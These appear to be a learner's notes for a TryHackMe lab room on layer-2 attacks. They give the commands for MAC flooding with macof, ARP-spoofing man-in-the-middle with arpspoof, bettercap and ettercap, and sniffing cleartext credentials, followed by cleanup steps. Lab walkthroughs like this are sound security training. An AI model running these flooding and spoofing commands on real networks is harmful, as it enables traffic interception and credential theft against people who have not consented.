# Notes — L2 MAC Flooding & ARP Spoofing


> These notes are ordered roughly by the room tasks: Initial Access, Discovery, Passive Sniffing, MAC Flooding sniffing, ARP Spoofing MITM (sniff & manipulate), Conclusion.


## Environment setup
- Start the TryHackMe machine and allow ~5 min for services to boot.
- From Kali (AttackBox or local VM) identify your interface: `ip a`
- Confirm connectivity: `ping -c 3 <target-ip>`


## 1) Initial access / Network discovery
- Use `netdiscover` or `arp-scan` to map the subnet.
- Example: `sudo arp-scan -l`
- Or: `sudo nmap -sn 10.10.0.0/24`
- Note the target's IP and MAC address for later.


## 2) Passive sniffing
- Start Wireshark or `tcpdump` on your interface to capture traffic without interfering.
- `sudo tcpdump -i eth0 -w passive.pcap` (replace `eth0`)
- Use filters to focus:
- Wireshark display filter for ARP: `arp`
- For HTTP: `http`


## 3) MAC Flooding — make switch act like a hub
- Tool: `macof` (part of `dsniff` package). `macof` floods a switch with fake MAC addresses to overflow its CAM table.
- Launch flooding (example):
- `sudo macof -i eth0` — floods from `eth0` and may fill switch MAC table.
- Alternative: use `Yersinia` or `Scapy` script to generate many src MAC addresses.


## 4) Sniff while MAC flooding
- While `macof` runs, start `tcpdump`/Wireshark to capture traffic destined to other hosts.
- `sudo tcpdump -i eth0 -w macflood.pcap`
- Inspect pcap in Wireshark to find interesting cleartext traffic (HTTP, credentials, etc.).


## 5) ARP Spoofing (MITM)
- Tools: `arpspoof` (dsniff), `ettercap`, `bettercap`.
- Identify IPs: victim and gateway. Example variables:
- `VICTIM=10.10.20.15`
- `GATEWAY=10.10.20.1`
- Enable IP forwarding on your attacker host:
- `sudo sysctl -w net.ipv4.ip_forward=1`
- Using arpspoof:
- `sudo arpspoof -i eth0 -t $VICTIM $GATEWAY`
- `sudo arpspoof -i eth0 -t $GATEWAY $VICTIM`
- Or use `bettercap` interactive: `sudo bettercap -iface eth0` then use `net.probe on`, `arp.spoof on` etc.


## 6) Sniffing & Manipulation
- With ARP spoofing in place, capture traffic with Wireshark or `tcpdump` to identify credentials.
- `ettercap` can perform active MITM and has filters to modify traffic (e.g., replace strings, inject content).
- Example: `sudo ettercap -T -q -M arp:sniff /$VICTIM// /$GATEWAY//`
- Remember to stop spoofing and restore ARP when done. `arpspoof` sends ARP replies and they time out; you can also send correct ARP replies to restore.


## 7) Cleanup
- Disable IP forwarding: `sudo sysctl -w net.ipv4.ip_forward=0`
- Kill flooding/spoofing processes: `pkill macof`, `pkill arpspoof`, `pkill ettercap`, `pkill bettercap`
- Optionally send correct ARP entries back to the network.


## Observations to record in the room
- Difference in packet capture before and after MAC flooding (more packets shown, other hosts' traffic visible)
- Evidence of ARP cache poisoning (arp table entries on victim changed)
- Any cleartext credentials or interesting protocol behaviour
